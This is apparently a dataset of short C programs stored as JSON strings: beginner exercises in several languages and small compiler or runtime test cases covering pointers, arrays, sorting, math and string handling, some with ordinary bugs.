    "#include <stdio.h>\n#include <math.h>\nint main() {\n double a, b, c, delta, r1, r2;\n scanf(\"%lf %lf %lf\", &a, &b, &c);\n if (a == 0)\n {\n  printf(\"Impossivel calcular\\n\");\n  return 0;\n }\n delta = pow(b, 2) - 4.0 * a * c;\n if (delta < 0)\n {\n  printf(\"Impossivel calcular\\n\");\n  return 0;\n }\n else if (delta == 0)\n {\n  r1 = -b / (2.0 * a);\n  printf(\"R1 = %.5lf\\n\", r1);\n }\n else\n {\n  r1 = (-b + sqrt(delta)) / (2.0 * a);\n  r2 = (-b - sqrt(delta)) / (2.0 * a);\n  printf(\"R1 = %.5lf\\nR2 = %.5lf\\n\", r1, r2);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main()\n{\n    char s[100];\n    char c = 'a';\n    char *p = ((void*)0);\n    p = &c;\n    printf(\"%c%c%c \", *p, *p + 1, *p + 2);\n    strcpy(s, \"ABC\");\n    printf(\"%s  %c%c%s\\n\", s, *s + 6, *s + 7, s + 1);\n    strcpy(s, \"she sells a seashell to a seashore\");\n    p = s + 14;\n    for ( ; *p!='\\0'; ++p)\n    {\n        if (*p == 'e')\n        {\n            *p = 'E';\n        } else if (*p == ' ')\n        {\n            *p = '\\n';\n        }\n    }\n    printf(\"%s\\n\",s);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  char letra_negativa = -128;\n  printf(\"La letra es: %c y su valor ASCII es: %i\\n\", letra_negativa, letra_negativa);\n  char letra = 'A';\n  printf(\"La letra es: %c y su valor ASCII es: %i\\n\", letra, letra);\n  letra = letra + 1;\n  printf(\"Ahora es: %c y su valor ASCII es: %i\\n\", letra, letra);\n  unsigned char letra_unsigned = 255;\n  printf(\"La letra es: %c y su valor ASCII es: %i\\n\", letra_unsigned, letra_unsigned);\n  printf(\"El tipo char ocupa %lu bytes = %lu bits \\n\", sizeof(char), sizeof(char)*8);\n  printf(\"El tipo char puede almacenar %lu\\n\", 2 ^ (sizeof(char) * 8));\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\nint main (int argc, char *argv[]) {\n  int ii;\n  int sum = 0;\n  double sum_sqrt = 0.0;\n  int size = 10;\n  int * numbers;\n  if (argc > 1) {\n    size = atoi(argv[1]);\n  }\n  numbers = (int *) malloc(size * sizeof(int));\n  for(ii=0;ii<size;ii++) {\n    numbers[ii] = rand() % 100 + 1;\n  }\n  for(ii=0;ii<size;ii++) {\n    sum += numbers[ii];\n    sum_sqrt += sqrt(numbers[ii]);\n  }\n  for(ii=0;ii<size;ii++) {\n    printf (\"%d \", numbers[ii]);\n  }\n  printf (\"\\nSum = %d\\n\", sum);\n  printf (\"Sum of square roots = %f\\n\", sum_sqrt);\n  free(numbers);\n  numbers = ((void*)0);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"Ol\u00e1, meu nome \u00e9 LEONARDO AREAS e este programa pode ser visto no seguinte endere\u00e7o no github: \");\n    int i, qtdMaior=0;\n    float av1[10];\n    float soma=0, media=0;\n    float maior=-999;\n    int qtdMaiorMedia6 = 0;\n    float percMaiorMedia6=0;\n    for(i=0; i<=9;i++)\n    {\n        printf(\"\\nEntre com a av1 do aluno %d:\", i+1);\n        scanf(\"%f\", &av1[i]);\n        soma = soma + av1[i];\n        if(av1[i] > maior)\n        {\n            maior = av1[i];\n        }\n    }\n    media = soma / i;\n    printf (\"\\nMedia = %.2f\\n\", media);\n    for(i=0;i<=9;i++)\n    {\n        if( av1[i] >= media )\n        {\n            printf(\"\\nEsta nota >= media - %.2f\", av1[i]);\n        }\n        if(av1[i] == maior)\n        {\n            qtdMaior++;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\nint sum (int num1, int num2)\n{\n    if (num1 > 2147483647 - num2)\n        return (-2147483647 -1);\n    else\n        return num1 + num2;\n}\nint main()\n{\n    int num1 = 2147483627;\n    int num2 = 20;\n    int result = sum(num1, num2);\n    if (result == (-2147483647 -1))\n    {\n        printf(\"Integer overflow occured... \\n\");\n    }\n    else\n    {\n        printf(\"Sum is %d \\n\", result);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint data[3];\nchar* words[3];\nint main(int argc, char **argv) {\n    void *gp;\n    printf (\"generic pointer example\\n\");\n    for (int i = 0; i < 3; i++) {\n        data[i] = i;\n    }\n    for (int i = 0; i < 3; i++) {\n        printf(\"%d\\n\", data[i]);\n    }\n    words[0] = \"zero\";\n    words[1] = \"one\";\n    words[2] = \"two\";\n    for (int i = 0; i < 3; i++) {\n        printf(\"%s\\n\", words[i]);\n    }\n    gp = data;\n    printf(\"\\ndata array address is %p\\n\", gp);\n    printf(\"item pointed to by gp is %d\\n\", *(int*)gp);\n    gp = (int*)gp + 1;\n    printf(\"item pointed to by gp is now %d\\n\", *(int*)gp);\n    gp = words;\n    printf(\"\\nwords array address is %p\\n\", gp);\n    printf(\"item pointed to by gp is %s\\n\", *(char**)gp);\n    gp = (char**)gp + 1;\n    printf(\"item pointed to by gp is now %s\\n\", *(char**)gp);\n    return 0;\n}",
    "#include <stdio.h>\nvoid auto_static(void){\n  int autoVar = 1;\n  static int staticVar = 1;\n  printf(\"automatic = %i, static = %i\\n\", autoVar, staticVar);\n  autoVar++;\n  staticVar++;\n}\nint main(void){\n  for (int i = 0; i < 5; i++)\n    auto_static();\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdarg.h>\nvoid error_at(char *fmt, ...) {\n  va_list ap;\n  __builtin_va_start(ap, fmt);\n  vfprintf((stderr), fmt, ap);\n  fprintf((stderr), \"\\n\");\n  exit(1);\n}\nint main(int argc, char* argv[])\n{\n  char *filename = argv[1];\n  FILE* fp = fopen(filename, \"r\");\n  if (fp == ((void*)0))\n    error_at(\"fopen error\");\n  if (fseek(fp, 0, (2)) == -1)\n    error_at(\"seek end error.\");\n  size_t size = ftell(fp);\n  if (size == -1)\n    error_at(\"ftell error.\");\n  if (fseek(fp, 0, (0)) == -1)\n    error_at(\"seek set error.\");\n  printf(\"size:%zd\\n\", size);\n  char *buf = calloc(1, size);\n  fread(buf, size, 1, fp);\n  int line = 0;\n  for(size_t i=0; i<size; i++){\n    printf(\"%c\", buf[i]);\n    if (buf[i] == '\\n') line++;\n  }\n  free(buf);\n  printf(\"line:%d\\n\", line);\n  return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,t;\n scanf(\"%d\",&t);\n while(t--)\n {\n  scanf(\"%d\",&n);\n  printf(\"%d\\n\",n+1);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    const double pi = 3.141592654;\n    const int days[12] = { 31, 28, 31, 30 };\n    const float *pf;\n    float * const pt;\n    const float * const ptr;\n    float const *pfc;\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\ndouble factorial(int a)\n{\n    double f=1.0;\n    int n = a;\n    while (a-- > 0)\n f *= (a+1);\n    printf(\"%d! = %g\\n\",n, f);\n    return f;\n}\ndouble C(int a, int b)\n{\n    double c;\n    if (a>=0 && b>=0)\n c = factorial(a)/(factorial(a-b)*factorial(b));\n    else\n c = 0;\n    printf(\"%dC%d = %g\\n\", a, b, c);\n    return c;\n}\nint main(int argc, char **argv)\n{\n    int multi = atoi(argv[1]);\n    int n = atoi(argv[2]);\n    int dim = (int) (C(n,(n-multi+1)/2) - C(n,(n-multi-1)/2));\n    printf(\"multi=%d nelec=%d dim=%d\\n\", multi, n, dim);\n    return 0;\n}",
    "#include <stdio.h>\nint main (int argc, char **argv)\n{\n  int x = 10;\n  int n = 0;\n  while (x) {\n    n += x & 1;\n    x >>= 1;\n  }\n  printf(\"%d\\n\", n);\n  return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n    int i;\n    int n;\n    int sum;\n    int a;\n   while ((scanf(\"%d\", &n) != (-1)) && (n != 0)) {\n        sum = 0;\n        for (i = 0; i < n; i++) {\n            scanf(\"%d\", &a);\n            sum += a;\n        }\n        printf(\"%d\\n\", sum);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint X;\nint S[11000];\nint N;\nvoid mysort(void) {\n    int i,j,h,t;\n    h=1;\n    while (h<N) h=3*h+1;\n    while (h>1) {\n        h=h/3;\n        for (i=h;i<N;i++) {\n            j=i-h;\n            while (j>=0 && S[j]>S[j+h]) {\n                t=S[j];S[j]=S[j+h];S[j+h]=t;\n                j-=h;\n            }\n        }\n    }\n}\nvoid datapacking(void) {\n    int i,j,disks;\n    scanf(\"%d %d\",&N,&X);\n    for (i=0;i<N;i++) scanf(\"%d\",S+i);\n    mysort();\n    i=0;j=N-1;\n    disks=0;\n    while (i<j) {\n        if (S[i]+S[j]<=X) i++;\n        j--;\n        disks++;\n    }\n    if (i==j) disks++;\n    printf(\"%d\\n\",disks);\n}\nint main(int argc, char **argv) {\n    int i,tc;\n    scanf(\"%d\",&tc);\n    for (i=1;i<=tc;i++) {\n        printf(\"Case #%d: \",i);\n        datapacking();\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint strStr(char* haystack, char* needle) {\n    if(*haystack=='\\0' || *needle=='\\0'){\n        return 0;\n    }\n    int i = 0;\n    int j = 0;\n    while(haystack[j] != '\\0'){\n         printf(\"haystack[]---%c\\n\", haystack[j]);\n        if(haystack[j] == needle[i]){\n            printf(\"---%c\", haystack[j]);\n            printf(\"---%c\\n\", needle[i]);\n            if(needle[i+1] == '\\0'){\n                return j - i;\n            }\n            i++;\n        j++;\n        }else{\n            j = j-i +1;\n            i = 0;\n        }\n    }\n    return -1;\n}\nint main(void){\n    int r = strStr(\"mississippi\", \"issip\");\n    printf(\"====%d\", r);\n    return 0;\n}",
    "#include <stdio.h>\n#pragma warning(disable : 4996)\n\n\n\n\n\n\nint main(void) {\n int num[5];\n printf(\"Enter 5 integers\\n\");\n for (int i = 0; i < 5; i++) {\n  printf(\"Enter the %d number:\", i + 1);\n  scanf(\"%d\", &num[i]);\n }\n for (int i = 0; i < 5; i++) {\n                          ;\n }\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nfloat calc(float initPayment, float monthlyPayment, float annualAppreciationRate, int yearCount)\n{\n    float total = initPayment;\n    for (int year = 1; year <= yearCount; year++)\n    {\n        total += (12 * monthlyPayment);\n        total *= ((annualAppreciationRate / 100) + 1);\n    }\n    return total;\n}\nint main()\n{\n    printf(\"Total money: %9.2f Kc\\n\", calc(0, 100, 10, 1));\n    printf(\"Total money: %9.2f Kc\\n\", calc(500, 100, 5, 2));\n    printf(\"Total money: %9.2f Kc\\n\", calc(10000, 1000, 4.5, 10));\n    return 0;\n}",
    "int string_length(char* string)\n{\n char* beginning = string;\n for(; *string++ != '\\0';);\n return (int)(string - beginning) - 1;\n}\nint string_compare2(char* string1, char* string2)\n{\n int result = *string1 - *string2;\n while(*string1++ != '\\0' && *string2++ != '\\0')\n {\n  result = *string1 - *string2;\n  if (result != 0)\n   break;\n }\n return result > 0 ? 1 : result < 0 ? -1 : 0;\n}\nint string_compare(char* string1, char* string2)\n{\n int result = *string1 - *string2;\n while((*string1 != '\\0') && (*string2 != '\\0') && result == 0)\n  result = *string1++ - *string2++;\n return result > 0 ? 1 : result < 0 ? -1 : 0;\n}\nvoid string_concatinate(char* destination, char* source1, char* source2)\n{\n while (*source1 != '\\0')\n  *destination++ = *source1++;\n while (*source2 != '\\0')\n  *destination++ = *source2++;\n *destination = '\\0';\n}\nvoid string_copy(char* destination, char* source)\n{\n while ((*destination++ = *source++) != '\\0');\n}\nint main()\n{\n char* name = \"Hari\";\n char* other_name = \"Harihar\";\n char* other_nameee = \"Hariharr\";\n int length = string_length(name);\n int same_string = string_compare2(name, other_name);\n int same_string2 = string_compare2(\"HallO\", \"Hallo\");\n int same_string3 = string_compare2(\"\", \"\");\n char arr[100];\n string_copy(arr, \"\");\n return 0;\n}",
    "#include<stdio.h>\n\n\n\n\n\nint power(int base,int times);\nint factor(int n);\nint main()\n{\n    int n;\n    scanf(\"%d\",&n);\n    int result = 1;\n    result = power(2,n-1) * factor(n-1);\n    if(n>7)\n        printf(\"46080\");\n    else\n        printf(\"%d\",result);\n    return 0;\n}\nint power(int base,int times)\n{\n    int result = 1;\n    for(int i=0;i<times;i++)\n        result *= base;\n    return result;\n}\nint factor(int n)\n{\n    int result = 1;\n    for(int i=0;i<n;i++)\n        result *= (i+1);\n    return result;\n}",
    "#include <stdio.h>\nint main()\n{\n float mid = 0, end = 0;\n printf(\"mid = \");\n scanf(\"%f\", &mid);\n printf(\"end = \");\n scanf(\"%f\", &end);\n float avg = mid * 0.3 + end * 0.7;\n printf(\"avg = %.2f\\n\", avg);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  double A=18;\n  double B=5;\n  printf(\"A\u7684\u503c\u662f\uff1a%lf\\n\",A);\n  printf(\"B\u7684\u503c\u662f\uff1a%lf\\n\",B);\n  printf(\"A+B\u7684\u503c\u662f\uff1a%lf\\n\",A+B);\n  printf(\"A-B\u7684\u503c\u662f\uff1a%lf\\n\",A-B);\n  printf(\"A*B\u7684\u503c\u662f\uff1a%lf\\n\",A*B);\n  printf(\"A/B\u7684\u503c\u662f\uff1a%lf\\n\",A/B);\n  A++;\n  printf(\"A\u81ea\u589e\u540e\u7684\u503c\u662f\uff1a%lf\\n\",A);\n  B--;\n  printf(\"B\u81ea\u51cf\u540e\u7684\u503c\u662f\uff1a%lf\\n\",B);\n  return 0;\n}",
    "#include<stdio.h>\nint maiorNaMatriz(int m[][4]){\n    int maior=0;\n    for(int i=0;i<4;i++){\n        for(int j=0;j<4;j++){\n            if(m[i][j]>maior){\n                maior = m[i][j];\n            }\n        }\n    }\n    return maior;\n}\nint main(void){\n    int mat[4][4];\n    for(int i=0;i<4;i++){\n        for(int j=0;j<4;j++){\n            scanf(\"%d\",&mat[i][j]);\n        }\n    }\n    int maior = maiorNaMatriz(mat);\n    printf(\"\\n%d\\n\",maior);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main() {\n  double a, b, s, m, n;\n  double angle, velocity;\n  while (scanf (\"%lf%lf%lf%lf%lf\", &a, &b, &s, &m, &n) != (-1)) {\n    if (a == 0 && b==0 && s==0 && m==0 && n==0)\n      break;\n    angle = atan( (b*n)/(a*m) ) * 180 / acos(-1);\n    velocity = sqrt(b*n*b*n+a*m*a*m) / s;\n    printf (\"%.2lf %.2lf\\n\", angle, velocity);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n        int *ptr, q;\n        q = 50;\n        ptr = &q;\n        printf(\"q=%d\\n\",q);\n        printf(\"la direccion de q es: %p\\n\", &ptr);\n        printf(\"accesando q con *ptr = %d \\n\", *ptr);\n        return 0;\n}",
    "void f() {\n  char c[4];\n  double d = 5;\n}\nint main(int argc, char** argv) {\n#pragma omp parallel sections\n  {\n#pragma omp section\n    f();\n#pragma omp section\n    f();\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int A[10000], N;\n printf(\"Enter the size:\\n\");\n scanf(\"%d\", &N);\n for (int i = 0; i < N; i++){\n  scanf(\"%d \", &A[i]);\n }\n for (int i = 0; i < N; i++)\n  printf(\"A[%d] = %d\\n\", i, A[i]);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,m,n,x,y,z;\n    scanf(\"%d%d\",&m,&n);\n    if(n==0){\n        z=0;\n        }\n    else if(m==1){\n        z=1;\n        }\n    else if(m==n){\n        z=1;\n        }\n    else{\n    for(x=1,i=m-n+1;i<=m;i++){\n        x=x*i;}\n    for(i=1,y=1;i<=n;i++){\n        y=y*i;}\n    z=x/y;}\n    printf(\"%d\",z);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n   int CurrentHeadNum,MaxTrackNum,ElementNum;\n   printf(\"Enter the current number of the header\\n\");\n   scanf(\"%d\",&CurrentHeadNum);\n   printf(\"Enter the maximum number of the tracks\\n\");\n   scanf(\"%d\",&MaxTrackNum);\n   printf(\"Enter the the element/request number\\n\");\n   scanf(\"%d\",&ElementNum);\n   printf(\"Enter the requests in order\\n\");\n   int count1=0,count2=0,queue[ElementNum],SeekTime=0,TotalSeekTime=0;\n   while (count1<ElementNum) {\n      int value;\n      scanf(\"%d\",&value);\n      if(value>0 && value<=MaxTrackNum)\n      {\n          queue[count1] = value;\n      }\n      count1++;\n   }\n   while (count2<ElementNum) {\n     SeekTime = abs(CurrentHeadNum - queue[count2]);\n     printf(\"%d----(%d)---->%d\\n\",CurrentHeadNum,SeekTime,queue[count2]);\n     CurrentHeadNum = queue[count2];\n     TotalSeekTime +=SeekTime;\n     count2++;\n   }\n   printf(\"The Total seek time is equal to:%d\\n\",TotalSeekTime);\n   printf(\"The Average Total seek time is equal to:%.2f\\n\",(float)TotalSeekTime/ElementNum);\n}",
    "#include<stdio.h>\nint main()\n{\n    int N;\n    scanf(\"%d\",&N);\n    double max = 0;\n    double average = 0;\n    double score[N];\n    for(int i=0;i<N;i++)\n    {\n        double exam;\n        scanf(\"%lf\",&exam);\n        score[i] = exam;\n    }\n    for(int i=0;i<N;i++)\n    {\n        if(score[i]>=max)\n        {\n            max = score[i];\n        }\n    }\n    for(int i=0;i<N;i++)\n    {\n        average = average+(double)((score[i]/max)*100);\n    }\n    printf(\"%.2f\",(double)(average/N));\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n char c;\n float b;\n int a;\n char palavra[10];\n printf(\"Digite uma palavra:\");\n scanf(\"%s\", &palavra);\n printf(\"Entre com um caracter:\");\n scanf(\"%s\", &c);\n printf(\"Entre com um ponto flutuante:\");\n scanf(\"%f\", &b);\n printf(\"Entre com um numero inteiro:\");\n scanf(\"%d\",&a);\n printf\n (\"Os dados lidos foram: %c, %.2f, %d \\n\",c,b,a);\n printf(\"Palavra digitada: %s\", palavra);\n printf(\"3. letra da Palavra digitada: %c\", palavra[2]);\n}",
    "#include<stdio.h>\nint main()\n{\n    char str[100];\n    fgets(str, 100, (stdin));\n    int i = 0, cont_consoante = 0;\n    while(str[i] != '\\n'){\n        if(str[i] != 'a' && str[i] != 'e' && str[i] != 'i' && str[i] != 'o' && str[i] != 'u' && str[i] != ' ')\n        {\n            cont_consoante++;\n        }\n        i++;\n    }\n    printf(\"%d\", cont_consoante);\n}",
    "#include<stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n, i, j;\n    int dif, min=999999;\n    scanf(\"%d\", &n);\n    int *arr = (int *)malloc(n*sizeof(int));\n    for(i=0; i<n; i++)\n        scanf(\"%d\", &arr[i]);\n    for(i=0; i<n-1; i++){\n        for(j=i+1; j<n; j++){\n            int d = arr[i]-arr[j];\n            if(d==0) dif = j-i;\n        }\n        if(min>dif)\n            min = dif;\n    }\n    min ==999999 ? printf(\"-1\") : printf(\"%d\", min);\n    return 0;\n}",
    "#include <pthread.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nstatic void *thread(void *arg) {\n  (void)arg;\n  sleep(1);\n  return 0;\n}\nint main() {\n  pthread_t th;\n  pthread_create(&th, 0, thread, 0);\n  setuid(0);\n  pthread_join(th, 0);\n  fprintf((stderr), \"DONE\\n\");\n  return 0;\n}",
    "int printf(const char *, ...);\nint main(){\n  int color=5;\n  int a,b;\n  int c,d;\n  int r;\n  int r2;\n  a=4;\n  b=6;\n  c=0;\n  b--;\n  r2 = a-b;\n  switch(color){\n  case 1:\n    a--;\n    c=b;\n    break;\n  case 2:\n    b++;\n    c=a;\n    break;\n  default:\n    break;\n  }\n  r = a-b;\n  return 0;\n}",
    "#include <stdio.h>\nint main( void ){\n  int a , b;\n  scanf(\"%d %d\" , &a , &b );\n  printf(\"%d %d\\n\" , b , a);\n  return 0;\n}",
    "#include<stdio.h>\nint main( void )\n{\n    int count = 10, x;\n    int *int_pointer;\n    int_pointer = &count;\n    x = *int_pointer;\n    printf( \"count = %i, x = %i\\n\", count, x );\n    return 0;\n}",
    "long function(char test[]) {\n  return (long)test;\n}\nint main() {\n  long a = function(\"asdf\");\n  long b = function(\"asdf\");\n  return a == b;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint board[3][3];\nint move[1000][2];\nint j = 1, N, resOdd = 0, resEven = 0, toCheck;\nvoid print () {\n  if (resOdd > resEven) {\n    printf(\"Black wins.\");\n  } else {\n    printf(\"White wins.\");\n  }\n}\nint end () {\n  if (resOdd != resEven) {\n    return 1;\n  }\n  return 0;\n}\nvoid bnw (int toCheck) {\n  if (toCheck == 1) {\n    resOdd++;\n  } else if (toCheck == 2) {\n    resEven++;\n  }\n}\nvoid check () {\n  if (board[0][1] == board[0][0] && board[0][1] == board[0][2]) {\n    toCheck = board[0][1];\n  }\n  if (board[1][1] == board[1][0] && board[1][1] == board[1][2]) {\n    toCheck = board[1][1];\n  }\n  if (board[2][1] == board[2][0] && board[2][1] == board[2][2]) {\n    toCheck = board[2][1];\n  }\n  if (board[1][0] == board[0][0] && board[1][0] == board[2][0]) {\n    toCheck = board[1][0];\n  }\n  if (board[1][1] == board[0][1] && board[1][1] == board[2][1]) {\n    toCheck = board[1][1];\n  }\n  if (board[1][2] == board[0][2] && board[1][2] == board[2][2]) {\n    toCheck = board[1][2];\n  }\n  if (board[1][1] == board[0][0] && board[1][1] == board[2][2]) {\n    toCheck = board[1][1];\n  }\n  if (board[1][1] == board[0][2] && board[1][1] == board[2][0]) {\n    toCheck = board[1][1];\n  }\n  bnw (toCheck);\n}\nint main() {\n  scanf(\"%d\", &N);\n  for (int i = 0; i < N; i++) {\n    scanf(\"%d %d\", &move[i][0], &move[i][1]);\n  }\n  for (int i = 0; i < N; i++) {\n    if (move[i][0] > 2 || move[i][0] < 0 || move[i][1] > 2 || move[i][1] < 0) {\n      continue;\n    } else if (board[move[i][0]][move[i][1]] != 0) {\n      continue;\n    } else {\n      if (j % 2 != 0) {\n        board[move[i][0]][move[i][1]] = 1;\n      } else {\n        board[move[i][0]][move[i][1]] = 2;\n      }\n      check();\n      if (end() == 1) {\n        print();\n        break;\n      }\n      j++;\n    }\n  }\n  if (resOdd == resEven) {\n    printf(\"There is a draw.\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int i = 0;\n    char c;\n    while ((c = getchar()) != '#') {\n        if (c == '\\n') continue;\n        printf(\"-%d\", c);\n        if ((++i % 8) == 0) printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, const char *argv[]) {\n    int fahr;\n    for (fahr = 0; fahr <= 300; fahr += 20) {\n        printf(\"%3d %8.2f\\n\", fahr, (5.0 / 9.0)*(fahr - 32));\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<limits.h>\n\nint min(int dist[],int visited[],int n)\n{\n    int min,i=0,j=0;\n    for(i=0;i<n;i++)\n    {\n        if(visited[i]!=1)\n        {\n            min=i;\n            break;\n        }\n    }\n    for(j=0;j<n;j++)\n    {\n        if(visited[j]==0&&dist[j]<dist[min])\n        {\n            min=j;\n        }\n    }\n    return min;\n}\nint minimum(int a,int b)\n{\n    if(a<b)\n        return a;\n    else\n        return b;\n}\nint main()\n{\n    int dist[100],path[100],i,j,n,weight[100][100],sv,visited[100],u;\n    printf(\"Enter the number of vertices\\n\");\n    scanf(\"%d\",&n);\n    printf(\"Enter the weight matrix\\n\");\n    for(i=0;i<n;i++)\n        for(j=0;j<n;j++)\n            scanf(\"%d\",&weight[i][j]);\n    printf(\"Enter the source vertex\\n\");\n    scanf(\"%d\",&sv);\n    for(i=0;i<n;i++)\n    {\n      dist[i]=weight[sv][i];\n      if(i==sv)\n      {\n          visited[sv]=1;\n      }\n      else\n        visited[i]=0;\n    }\n    for(i=0;i<n;i++)\n        path[i]=sv;\n    for(i=0;i<n;i++)\n    {\n        u=min(dist,visited,n);\n        visited[u]=1;\n        for(j=0;j<n;j++)\n           {\n               if(visited[j]==0)\n               {\n                   dist[j]=minimum(dist[j],(weight[u][j]+dist[u]));\n               }\n           }\n    }\n      for(i=0;i<n;i++)\n        printf(\"Least distance from source-vertex %d to vertex %d is %d units\\n\",sv,i,dist[i]);\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint func(int x)\n{\n    return x*2;\n}\nint main()\n{\n    int x;\n    int (*pf)(int) = func;\n    printf(\"Insira um inteiro: \\n\");\n    scanf(\"%d\",&x);\n    printf(\"\\nO dobro \u00e9 %d\",pf(x));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main ( void )\n{\n   char* aa = malloc(8);\n   aa[-1] = 17;\n   if (aa[-1] == 17)\n      printf(\"17\\n\"); else printf(\"not 17\\n\");\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid die_usage(void)\n{\n  fprintf((stderr), \"Usage: access-itself\\n\");\n  exit(1);\n}\nint main(int argc, char const *argv[])\n{\n  if (argc > 1) {\n    die_usage();\n  }\n  int res = access(argv[0], (1));\n  if (res == -1) {\n    perror(\"access\");\n    exit(1);\n  }\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n\nint top=-1;\nfloat stack[100];\nfloat power(float a,float b)\n{\n    if(b==0)return 1;\n    else return (a*power(a,b-1));\n}\nvoid push(float n)\n{\n    if(top==100 -1){\n        printf(\"Stack Overflow .\");\n        return ;\n    }\n    stack[++top]=n;\n}\nfloat pop()\n{\n    if(top==-1){\n        printf(\" Stack Underflow.\");\n        return -1;\n    }\n    float x=stack[top--];\n    return x;\n}\nfloat evaluateExp(char postfix[],float v[])\n{\n    int i=0;\n    char ch;\n    float op1,op2,r;\n    while(postfix[i]!='\\0'){\n        ch = postfix[i];\n        if((ch>=65&&ch<=90)||(ch>=97&&ch<=122)){\n            push(v[i]);\n        }\n        else{\n            op2=pop();\n            op1=pop();\n            switch(ch){\n                case '^' : r=power(op1,op2);\n                           push(r);\n                           break;\n                case '/' : r=op1/op2;\n                           push(r);\n                           break;\n                case '*' : r=op1*op2;\n                           push(r);\n                           break;\n                case '+' : r=op1+op2;\n                           push(r);\n                           break;\n                case '-' : r=op1-op2;\n                           push(r);\n                           break;\n                default : printf(\" Operator Not Present.\\n\");\n                           break;\n            }\n        }\n        i++;\n    }\n    r=pop();\n    return r;\n}\nint main()\n{\n    char postfix[100],ch;\n    int t,i,j=0;\n    float v[100],res;\n    printf(\" Enter no. of test cases :\");\n    scanf(\"%d\",&t);\n    for(i=0;i<t;i++){\n        printf(\"\\n Enter a valid Postfix Expression :\\n\");\n        scanf(\"%s\",&postfix);\n        while(postfix[j]!='\\0'){\n            ch = postfix[j];\n            if((ch>=65&&ch<=90)||(ch>=97&&ch<=122)){\n                printf(\" Enter the value of %c :\",ch);\n                scanf(\"%f\",&v[j]);\n            }\n            j++;\n        }\n        res=evaluateExp(postfix,v);\n        printf(\" \\n Result of the Postfix Expression :\\n%f\",res);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n    int n,m,ap=0,bp=0;\n    scanf(\"%d\",&n);\n    int a[n];\n    for(int i=0;i<n;i++)\n    {\n        scanf(\"%d\",&a[i]);\n    }\n    scanf(\"%d\",&m);\n    int b[m];\n    for(int i=0;i<m;i++)\n    {\n        scanf(\"%d\",&b[i]);\n    }\n    while(ap<n && bp<m)\n    {\n        if(a[ap]>b[bp])\n        {\n            printf(\"%d \",b[bp]);\n            bp++;\n        }\n        else if(a[ap]<b[bp])\n        {\n            printf(\"%d \",a[ap]);\n            ap++;\n        }\n    }\n    if(ap<=n-1)\n    {\n        for(int i=ap;i<n;i++)\n            printf(\"%d \",a[i]);\n    }\n    if(bp<=m-1)\n    {\n        for(int i=bp;i<m;i++)\n        printf(\"%d \",b[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a = 10;\nhere:\n printf(\"%d\\n\",a);\n a--;\n if( a > 0 )\n  goto here;\n return(0);\n}",
    "#include <stdio.h>\nint main()\n{\n    int n;\n    int i=1;\n    while(1){\n        scanf(\"%d\",&n);\n        if(n==2002){\n           printf(\"Acesso Permitido\\n\");\n           break;\n        }\n        else{\n            printf(\"Senha Invalida\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n  int tab[512], licznik, liczba = 128, index = 0;\n  int *wskaznik = &liczba;\n  for (licznik = 0; licznik <= 512; index++) {\n    tab[licznik] = *wskaznik;\n    printf(\"%d ==> %d\\n\", index, tab[licznik]);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  int a = 10, b = 10;\n  int x, y;\n  x = 10, y = 10;\n  printf(\"=============\\n\");\n  printf(\"  x = %d\\n\", x);\n  printf(\"++x = %d\\n\", ++x);\n  printf(\"  x = %d\\n\", x);\n  printf(\"=============\\n\");\n  printf(\"=============\\n\");\n  printf(\"  y = %d\\n\", y);\n  printf(\"y++ = %d\\n\", y++);\n  printf(\"  y = %d\\n\", y);\n  printf(\"=============\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main()\n{\n    double nums[1000];\n    int n, i;\n    double media = 0, varianza = 0, desviacion;\n    scanf(\"%d\", &n);\n    for (i = 0; i < n; i++)\n    {\n        scanf(\"%lf\", &nums[i]);\n        media += nums[i];\n    }\n    media /= n;\n    for (i = 0; i < n; i++)\n        varianza += pow(nums[i] - media, 2);\n    varianza /= n;\n    desviacion = sqrt(varianza);\n    printf(\"%lf\\n%lf\\n%lf\", media, varianza, desviacion);\n    return 0;\n}",
